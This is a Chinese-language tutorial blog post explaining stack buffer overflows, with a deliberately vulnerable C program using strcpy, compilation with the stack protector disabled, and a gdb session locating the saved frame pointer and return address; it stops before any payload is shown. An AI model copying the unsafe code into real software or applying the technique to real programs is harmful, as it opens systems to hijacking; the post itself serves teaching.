---
categories:
- 技术文章
date: '2008-09-06'
title: (原创)攻击方式学习之(3) - 缓冲区溢出(Buffer Overflow)
url: /2008/09/06/1285693/

---


### 堆栈溢出

堆栈溢出通常是所有的缓冲区溢出中最容易进行利用的。了解堆栈溢出之前，先了解以下几个概念： 

1.  缓冲区

        *   简单说来是一块连续的计算机内存区域，可以保存相同数据类型的多个实例。
2.  堆栈

        *   堆 栈是一个在计算机科学中经常使用的抽象数据类型。堆栈中的物体具有一个特性：最后一个放入堆栈中的物体总是被最先拿出来，这个特性通常称为后进先出 (LIFO)队列。堆栈中定义了一些操作。两个最重要的是PUSH和POP。PUSH操作在堆栈的顶部加入一个元素。POP操作相反，在堆栈顶部移去一个 元素，并将堆栈的大小减一。
3.  寄存器ESP、EBP、EIP

        1.  CPU的ESP寄存器存放当前线程的栈顶指针，2.  EBP寄存器中保存当前线程的栈底指针。3.  CPU的EIP寄存器存放下一个CPU指令存放的内存地址，当CPU执行完当前的指令后，从EIP寄存器中读取下一条指令的内存地址，然后继续执行。

现 代计算机被设计成能够理解人们头脑中的高级语言。在使用高级语言构造程序时最重要的技术是过程(procedure)和函数(function)。从这一 点来看，一个过程调用可以象跳转(jump)命令那样改变程序的控制流程，但是与跳转不同的是，当工作完成时,函数把控制权返回给调用之后的语句或指令。 这种高级抽象实现起来要靠堆栈的帮助。堆栈也用于给函数中使用的局部变量动态分配空间，同样给函数传递参数和函数返回值也要用到堆栈。

堆栈由逻辑堆栈帧组成。当调用函数时逻辑堆栈帧被压入栈中，当函数返回时逻辑堆栈帧被从栈中弹出。堆栈帧包括函数的参数，函数地局部变量，以及恢复前一个堆栈帧所需要的数据，其中包括在函数调用时指令指针(IP)的值。

当一个例程被调用时所必须做的第一件事是保存前一个 FP(这样当例程退出时就可以恢复)。然后它把SP复制到FP，创建新的FP，把SP向前移动为局部变量保留空间。这称为例程的序幕(prolog)工 作。当例程退出时，堆栈必须被清除干净，这称为例程的收尾(epilog)工作。Intel的ENTER和LEAVE指令，Motorola的LINK和 UNLINK指令，都可以用于有效地序幕和收尾工作。

下面我们用一个简单的例子来展示堆栈的模样: example1.c: 

<div dir="ltr">
<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;"><span style="color: #cdcaa9; font-weight: bold;">void</span> <span style="color: #ff0086; font-weight: bold;">function</span><span style="color: #ffffff;">(</span><span style="color: #cdcaa9; font-weight: bold;">int</span> <span style="color: #ffffff;">a</span><span style="color: #ffffff;">,</span> <span style="color: #cdcaa9; font-weight: bold;">int</span> <span style="color: #ffffff;">b</span><span style="color: #ffffff;">,</span> <span style="color: #cdcaa9; font-weight: bold;">int</span> <span style="color: #ffffff;">c</span><span style="color: #ffffff;">)</span> <span style="color: #ffffff;">{</span>

<span style="color: #ffffff;">&nbsp;&nbsp; </span><span style="color: #cdcaa9; font-weight: bold;">char</span> <span style="color: #ffffff;">buffer1</span><span style="color: #ffffff;">[</span><span style="color: #0086f7; font-weight: bold;">5</span><span style="color: #ffffff;">];</span>

<span style="color: #ffffff;">&nbsp;&nbsp; </span><span style="color: #cdcaa9; font-weight: bold;">char</span> <span style="color: #ffffff;">buffer2</span><span style="color: #ffffff;">[</span><span style="color: #0086f7; font-weight: bold;">10</span><span style="color: #ffffff;">];</span>

<span style="color: #ffffff;">}</span>

<span style="color: #cdcaa9; font-weight: bold;">void</span> <span style="color: #ff0086; font-weight: bold;">main</span><span style="color: #ffffff;">()</span> <span style="color: #ffffff;">{</span>

&nbsp;<span style="color: #ffffff;">function</span><span style="color: #ffffff;">(</span><span style="color: #0086f7; font-weight: bold;">1</span><span style="color: #ffffff;">,</span><span style="color: #0086f7; font-weight: bold;">2</span><span style="color: #ffffff;">,</span><span style="color: #0086f7; font-weight: bold;">3</span><span style="color: #ffffff;">);</span>

<span style="color: #ffffff;">}</span></div>
</div>

为了理解程序在调用function()时都做了哪些事情, 我们使用gcc的-S选项编译, 以产生汇编代码输出: 

<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;">$ gcc -S -o example1.s example1.c</div>

通过查看汇编语言输出, 我们看到对function()的调用被翻译成: 

<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;"><span style="color: #ffffff;">pushl</span> <span style="color: #ffffff;">$</span><span style="color: #0086f7; font-weight: bold;">3</span>

<span style="color: #ffffff;">pushl</span> <span style="color: #ffffff;">$</span><span style="color: #0086f7; font-weight: bold;">2</span>

<span style="color: #ffffff;">pushl</span> <span style="color: #ffffff;">$</span><span style="color: #0086f7; font-weight: bold;">1</span>

<span style="color: #ffffff;">call</span> <span style="color: #ffffff;">function</span></div>

&nbsp;

以从后往前的顺序将function的三个参数压入栈中, 然后调用function(). 指令call会把指令指针(IP)也压入栈中. 我们把这被保存的IP称为返回地址(RET). 在函数中所做的第一件事情是例程的序幕工作: 

<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;"><span style="color: #ffffff;">pushl</span> <span style="color: #ffffff;">%</span><span style="color: #ffffff;">ebp</span>

<span style="color: #ffffff;">movl</span> <span style="color: #ffffff;">%</span><span style="color: #ffffff;">esp</span><span style="color: #ffffff;">,</span><span style="color: #ffffff;">%</span><span style="color: #ffffff;">ebp</span>

<span style="color: #ffffff;">subl</span> <span style="color: #ffffff;">$</span><span style="color: #0086f7; font-weight: bold;">20</span><span style="color: #ffffff;">,</span><span style="color: #ffffff;">%</span><span style="color: #ffffff;">esp</span></div>

&nbsp;

将帧指针EBP压入栈中. 然后把当前的SP复制到EBP, 使其成为新的帧指针. 我们把这个被保存的FP叫做SFP. 接下来将SP的值减小, 为局部变量保留空间. 我 们必须牢记:内存只能以字为单位寻址. 在这里一个字是4个字节, 32位. 因此5字节的缓冲区会占用8个字节(2个字)的内存空间, 而10个字节的缓冲区会占用12个字节(3个字)的内存空间. 这就是为什么SP要减掉20的原因. 这样我们就可以想象function()被调用时堆栈的模样:

![](http://images.cnblogs.com/cnblogs_com/coderzh/security/ebp.JPG)&nbsp;

所以，从上图来看，假如我们输入的buffer1超长了，直接覆盖掉后面的sfp和ret，就可以修改该函数的返回地址了。下面来看一个示例吧。 

### 示例

关于如何编写Shell Code，如何在内存中预先准备好一段危险的执行代码以及如何精确计算通过缓冲区溢出执行那段危险代码同时又让返回地址调回原来返回地址&#8230;&#8230;这中间涉及太 多的底层汇编知识，小弟不才也只是走马观花，成不了真正的黑客高手。但从黑客朋友的水平之高看来，提高我们的代码安全性是非常必要的！

因此，在这个例子中，我们假设所谓的危险代码已经在 源代码中，即函数bar。函数foo是正常的函数，在main函数中被调用，执行了一段非常不安全的strcpy工作。利用不安全的strcpy，我们可 以传入一个超过缓冲区buf长度的字符串，执行拷贝后，缓冲区溢出，把ret返回地址修改成函数bar的地址，达到调用函数bar的目的。 

<div dir="ltr">
<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;"><span style="color: #cd5c5c;">#include &lt;stdio.h&gt;</span>

<span style="color: #cd5c5c;">#include &lt;string.h&gt;</span>

<span style="color: #bdb76b;">void</span> <span style="color: #ffffff;">foo</span><span style="color: #ffffff;">(</span><span style="color: #f0e68c;">const</span> <span style="color: #bdb76b;">char</span><span style="color: #ffffff;">*</span> <span style="color: #ffffff;">input</span><span style="color: #ffffff;">)</span>

<span style="color: #ffffff;">{</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #bdb76b;">char</span> <span style="color: #ffffff;">buf</span><span style="color: #ffffff;">[</span><span style="color: #ffffff;">10</span><span style="color: #ffffff;">];</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">printf</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">"My stack looks like:</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">%p</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">%p</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">%p</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">%p</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">%p</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">%p</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">%p</span><span style="color: #ffffff;">\n\n</span><span style="color: #ffffff;">"</span><span style="color: #ffffff;">);</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">strcpy</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">buf</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">input</span><span style="color: #ffffff;">);</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">printf</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">"buf = %s</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">"</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">buf</span><span style="color: #ffffff;">);</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">printf</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">"Now the stack looks like:</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">%p</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">%p</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">%p</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">%p</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">%p</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">%p</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">%p</span><span style="color: #ffffff;">\n\n</span><span style="color: #ffffff;">"</span><span style="color: #ffffff;">);</span>

<span style="color: #ffffff;">}</span>

<span style="color: #bdb76b;">void</span> <span style="color: #ffffff;">bar</span><span style="color: #ffffff;">(</span><span style="color: #bdb76b;">void</span><span style="color: #ffffff;">)</span>

<span style="color: #ffffff;">{</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">printf</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">"Augh! I've been hacked!</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">"</span><span style="color: #ffffff;">);</span>

<span style="color: #ffffff;">}</span>

<span style="color: #bdb76b;">int</span> <span style="color: #ffffff;">main</span><span style="color: #ffffff;">(</span><span style="color: #bdb76b;">int</span> <span style="color: #ffffff;">argc</span><span style="color: #ffffff;">,</span> <span style="color: #bdb76b;">char</span><span style="color: #ffffff;">*</span> <span style="color: #ffffff;">argv</span><span style="color: #ffffff;">[])</span>

<span style="color: #ffffff;">{</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">printf</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">"Address of foo = %p</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">"</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">foo</span><span style="color: #ffffff;">);</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">printf</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">"Address of bar = %p</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">"</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">bar</span><span style="color: #ffffff;">);</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #f0e68c;">if</span> <span style="color: #ffffff;">(</span><span style="color: #ffffff;">argc</span> <span style="color: #ffffff;">!=</span> <span style="color: #ffffff;">2</span><span style="color: #ffffff;">)</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">{</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">printf</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">"Please supply a string as an argument!</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">"</span><span style="color: #ffffff;">);</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #f0e68c;">return</span> <span style="color: #ffffff;">-</span><span style="color: #ffffff;">1</span><span style="color: #ffffff;">;</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">}</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">foo</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">argv</span><span style="color: #ffffff;">[</span><span style="color: #ffffff;">1</span><span style="color: #ffffff;">]);</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">printf</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">"Exit!</span><span style="color: #ffffff;">\n</span><span style="color: #ffffff;">"</span><span style="color: #ffffff;">);</span>

<span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #f0e68c;">return</span> <span style="color: #ffffff;">0</span><span style="color: #ffffff;">;</span>

<span style="color: #ffffff;">}</span></div>
</div>

&nbsp;

用GCC编译上面的程序，同时注意关闭Buffer Overflow Protect开关： 

<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;">gcc -g -fno-stack-protector test.c -o test</div>

&nbsp;

为了找出返回地址，我用gdb调试上面编译出来的程序。 

<div dir="ltr">
<div style="border: 1px solid #cccccc; padding: 4px 5px 4px 14px; background-color: #333333; color: #ffffff;"><span style="color: #87ceeb;">//（前面启动gdb，设置参数和断点的步骤省略&#8230;&#8230;）</span>

<span style="color: #ffffff;">(</span><span style="color: #ffffff;">gdb</span><span style="color: #ffffff;">)</span> <span style="color: #ffffff;">r</span>

<span style="color: #ffffff;">Starting</span> <span style="color: #ffffff;">program</span><span style="color: #ffffff;">:</span> <span style="color: #ffffff;">/</span><span style="color: #ffffff;">media</span><span style="color: #ffffff;">/</span><span style="color: #ffffff;">Personal</span><span style="color: #ffffff;">/</span><span style="color: #ffffff;">MyProject</span><span style="color: #ffffff;">/</span><span style="color: #ffffff;">C</span><span style="color: #ffffff;">/</span><span style="color: #ffffff;">StackOver</span><span style="color: #ffffff;">/</span><span style="color: #ffffff;">test</span> <span style="color: #ffffff;">abc</span>

<span style="color: #ffffff;">Address</span> <span style="color: #ffffff;">of</span> <span style="color: #ffffff;">foo</span> <span style="color: #ffffff;">=</span> <span style="color: #ffffff;">0</span><span style="color: #ffffff;">x80483d4</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #87ceeb;">//函数foo的地址</span>

<span style="color: #ffffff;">Address</span> <span style="color: #ffffff;">of</span> <span style="color: #ffffff;">bar</span> <span style="color: #ffffff;">=</span> <span style="color: #ffffff;">0</span><span style="color: #ffffff;">x8048419</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #87ceeb;">//函数bar的地址</span>

<span style="color: #ffffff;">Breakpoint</span> <span style="color: #ffffff;">1</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">main</span> <span style="color: #ffffff;">(</span><span style="color: #ffffff;">argc</span><span style="color: #ffffff;">=</span><span style="color: #ffffff;">2</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">argv</span><span style="color: #ffffff;">=</span><span style="color: #ffffff;">0</span><span style="color: #ffffff;">xbfe5ab24</span><span style="color: #ffffff;">)</span> <span style="color: #ffffff;">at</span> <span style="color: #ffffff;">test</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">c</span><span style="color: #ffffff;">:</span><span style="color: #ffffff;">24</span>

<span style="color: #ffffff;">24</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">foo</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">argv</span><span style="color: #ffffff;">[</span><span style="color: #ffffff;">1</span><span style="color: #ffffff;">]);</span>

<span style="color: #87ceeb;">//在调用foo函数前，我们查看ebp值</span>

<span style="color: #ffffff;">(</span><span style="color: #ffffff;">gdb</span><span style="color: #ffffff;">)</span> <span style="color: #ffffff;">info</span> <span style="color: #ffffff;">registers</span> <span style="color: #ffffff;">ebp</span>

<span style="color: #ffffff;">ebp</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">0</span><span style="color: #ffffff;">xbfe5aa88</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">0</span><span style="color: #ffffff;">xbfe5aa88</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #87ceeb;">//ebp值为0xbfe5aa88</span>

<span style="color: #ffffff;">(</span><span style="color: #ffffff;">gdb</span><span style="color: #ffffff;">)</span> <span style="color: #ffffff;">n</span>

<span style="color: #ffffff;">Breakpoint</span> <span style="color: #ffffff;">2</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">foo</span> <span style="color: #ffffff;">(</span><span style="color: #ffffff;">input</span><span style="color: #ffffff;">=</span><span style="color: #ffffff;">0</span><span style="color: #ffffff;">xbfe5c652</span> <span style="color: #ffffff;">"abc"</span><span style="color: #ffffff;">)</span> <span style="color: #ffffff;">at</span> <span style="color: #ffffff;">test</span><span style="color: #ffffff;">.</span><span style="color: #ffffff;">c</span><span style="color: #ffffff;">:</span><span style="color: #ffffff;">4</span>

<span style="color: #ffffff;">4</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #f0e68c;">{</span>

<span style="color: #ffffff;">(</span><span style="color: #ffffff;">gdb</span><span style="color: #ffffff;">)</span> <span style="color: #ffffff;">n</span>

<span style="color: #ffffff;">6</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">printf</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">"My stack looks like:\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n\n"</span><span style="color: #ffffff;">);</span>

<span style="color: #87ceeb;">//执行到foo后，我们再查看ebp值</span>

<span style="color: #ffffff;">(</span><span style="color: #ffffff;">gdb</span><span style="color: #ffffff;">)</span> <span style="color: #ffffff;">info</span> <span style="color: #ffffff;">registers</span> <span style="color: #ffffff;">ebp</span>

<span style="color: #ffffff;">ebp</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">0</span><span style="color: #ffffff;">xbfe5aa68</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">0</span><span style="color: #ffffff;">xbfe5aa68</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #87ceeb;">//ebp值变成了0xbfe5aa68</span>

<span style="color: #87ceeb;">//我们来查看一下地址0xbfe5aa68究竟是啥东东：</span>

<span style="color: #ffffff;">(</span><span style="color: #ffffff;">gdb</span><span style="color: #ffffff;">)</span> <span style="color: #ffffff;">x</span><span style="color: #ffffff;">/</span> <span style="color: #ffffff;">0</span><span style="color: #ffffff;">xbfe5aa68</span>

<span style="color: #ffffff;">0</span><span style="color: #ffffff;">xbfe5aa68</span><span style="color: #ffffff;">:</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">0</span><span style="color: #ffffff;">xbfe5aa88</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #87ceeb;">//原来地址0xbfe5aa68存放的居然是我们之前的ebp值，其实豁然开朗了，因为这是执行了push %ebp后将之前的ebp保存起来了，和前面说的居然是一样的！</span>

<span style="color: #ffffff;">(</span><span style="color: #ffffff;">gdb</span><span style="color: #ffffff;">)</span> <span style="color: #ffffff;">n</span>

<span style="color: #ffffff;">My</span> <span style="color: #ffffff;">stack</span> <span style="color: #ffffff;">looks</span> <span style="color: #ffffff;">like</span><span style="color: #ffffff;">:</span>

<span style="color: #ffffff;">0</span><span style="color: #ffffff;">xb7ee04e0</span>

<span style="color: #ffffff;">0</span><span style="color: #ffffff;">x8048616</span>

<span style="color: #ffffff;">0</span><span style="color: #ffffff;">xbfe5aa74</span>

<span style="color: #ffffff;">0</span><span style="color: #ffffff;">xbfe5aa74</span>

<span style="color: #ffffff;">0</span><span style="color: #ffffff;">xb7edfff4</span>

<span style="color: #ffffff;">0</span><span style="color: #ffffff;">xbfe5aa88</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #87ceeb;">//看，在代码中输入堆栈信息中也出现了熟悉的0xbfe5aa88，因此可以断定该处为保存的上一级的ebp值。对应上上面那个图中的sfp。</span>

<span style="color: #ffffff;">0</span><span style="color: #ffffff;">x8048499</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #87ceeb;">//假如0xbfe5aa88就是sfp的话，那0x8048499应该就是ret（返回地址）了，下面来验证一下</span>

<span style="color: #ffffff;">7</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">strcpy</span><span style="color: #ffffff;">(</span><span style="color: #ffffff;">buf</span><span style="color: #ffffff;">,</span> <span style="color: #ffffff;">input</span><span style="color: #ffffff;">);</span>

<span style="color: #87ceeb;">//查看0x8048499里面是什么东东</span>

<span style="color: #ffffff;">(</span><span style="color: #ffffff;">gdb</span><span style="color: #ffffff;">)</span> <span style="color: #ffffff;">x</span><span style="color: #ffffff;">/</span><span style="color: #ffffff;">i</span> <span style="color: #ffffff;">0</span><span style="color: #ffffff;">x8048499</span>

<span style="color: #ffffff;">0</span><span style="color: #ffffff;">x8048499</span> <span style="color: #ffffff;">&lt;</span><span style="color: #ffffff;">main</span><span style="color: #ffffff;">+</span><span style="color: #ffffff;">108</span><span style="color: #ffffff;">&gt;:</span><span style="color: #ffffff;">&nbsp;&nbsp; </span><span style="color: #ffffff;">movl</span><span style="color: #ffffff;">&nbsp;&nbsp; </span><span style="color: #ffffff;">$</span><span style="color: #ffffff;">0</span><span style="color: #ffffff;">x8048653</span><span style="color: #ffffff;">,(%</span><span style="color: #ffffff;">esp</span><span style="color: #ffffff;">)</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #87ceeb;">//这句代码是main函数中的代码，正是我们执行完foo函数后的下一个地址。不信，看看main的assemble：</span>

<span style="color: #ffffff;">(</span><span style="color: #ffffff;">gdb</span><span style="color: #ffffff;">)</span> <span style="color: #ffffff;">disassemble</span> <span style="color: #ffffff;">main</span>

<span style="color: #ffffff;">Dump</span> <span style="color: #ffffff;">of</span> <span style="color: #ffffff;">assembler</span> <span style="color: #ffffff;">code</span> <span style="color: #f0e68c;">for</span> <span style="color: #ffffff;">function</span> <span style="color: #ffffff;">main</span><span style="color: #ffffff;">:</span>

<span style="color: #ffffff;">0</span><span style="color: #ffffff;">x0804842d</span> <span style="color: #ffffff;">&lt;</span><span style="color: #ffffff;">main</span><span style="color: #ffffff;">+</span><span style="color: #ffffff;">0</span><span style="color: #ffffff;">&gt;:</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">lea</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">0</span><span style="color: #ffffff;">x4</span><span style="color: #ffffff;">(%</span><span style="color: #ffffff;">esp</span><span style="color: #ffffff;">),%</span><span style="color: #ffffff;">ecx</span>

<span style="color: #ffffff;">0</span><span style="color: #ffffff;">x08048431</span> <span style="color: #ffffff;">&lt;</span><span style="color: #ffffff;">main</span><span style="color: #ffffff;">+</span><span style="color: #ffffff;">4</span><span style="color: #ffffff;">&gt;:</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">and</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">$</span><span style="color: #ffffff;">0</span><span style="color: #ffffff;">xfffffff0</span><span style="color: #ffffff;">,%</span><span style="color: #ffffff;">esp</span>

<span style="color: #ffffff;">0</span><span style="color: #ffffff;">x08048434</span> <span style="color: #ffffff;">&lt;</span><span style="color: #ffffff;">main</span><span style="color: #ffffff;">+</span><span style="color: #ffffff;">7</span><span style="color: #ffffff;">&gt;:</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp; </span><span style="color: #ffffff;">pushl</span>&nbsp;<span style="color: #ffffff;">-</span><span style="color: #ffffff;">0</span><span style="color: #ffffff;">x4</span><span style="color: #ffffff;">(%</span><span style="color: #ffffff;">ecx</span><span style="color: #ffffff;">)</span>

<span style="color: #ffffff;">0</span><span style="color: #ffffff;">x08048437</span> <span style="color: #ffffff;">&lt;</span><span style="color: #ffffff;">main</span><span style="color: #ffffff;">+</span><span style="color: #ffffff;">10</span><span style="color: #ffffff;">&gt;:</span><span style="color: #ffffff;">&nbsp;&nbsp; </span><span style="color: #ffffff;">push</span><span style="color: #ffffff;">&nbsp;&nbsp; </span><span style="color: #ffffff;">%</span><span style="color: #ffffff;">ebp</span>

<span style="color: #87ceeb;">//（中间省略&#8230;&#8230;）</span>

<span style="color: #ffffff;">0</span><span style="color: #ffffff;">x08048494</span> <span style="color: #ffffff;">&lt;</span><span style="color: #ffffff;">main</span><span style="color: #ffffff;">+</span><span style="color: #ffffff;">103</span><span style="color: #ffffff;">&gt;:</span>&nbsp;<span style="color: #ffffff;">call</span><span style="color: #ffffff;">&nbsp;&nbsp; </span><span style="color: #ffffff;">0</span><span style="color: #ffffff;">x80483d4</span> <span style="color: #ffffff;">&lt;</span><span style="color: #ffffff;">foo</span><span style="color: #ffffff;">&gt;</span>

<span style="color: #ffffff;">0</span><span style="color: #ffffff;">x08048499</span> <span style="color: #ffffff;">&lt;</span><span style="color: #ffffff;">main</span><span style="color: #ffffff;">+</span><span style="color: #ffffff;">108</span><span style="color: #ffffff;">&gt;:</span>&nbsp;<span style="color: #ffffff;">movl</span><span style="color: #ffffff;">&nbsp;&nbsp; </span><span style="color: #ffffff;">$</span><span style="color: #ffffff;">0</span><span style="color: #ffffff;">x8048653</span><span style="color: #ffffff;">,(%</span><span style="color: #ffffff;">esp</span><span style="color: #ffffff;">)</span><span style="color: #ffffff;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span style="color: #87ceeb;">//就是这里了！哈</span>

<span style="color: #ffffff;">0</span><span style="color: #ffffff;">x080484a0</span> <span style="color: #ffffff;">&lt;</span><span style="color: #ffffff;">main</span><span style="color: #ffffff;">+</span><span style="color: #ffffff;">115</span><span style="color: #ffffff;">&gt;:</span>&nbsp;<span style="color: #ffffff;">call</span><span style="color: #ffffff;">&nbsp;&nbsp; </span><span style="color: #ffffff;">0</span><span style="color: #ffffff;">x8048340</span> <span style="color: #ffffff;">&lt;</span><span style="color: #ffffff;">puts@plt</span><span style="color: #ffffff;">&gt;</span></div>
</div>

&nbsp;

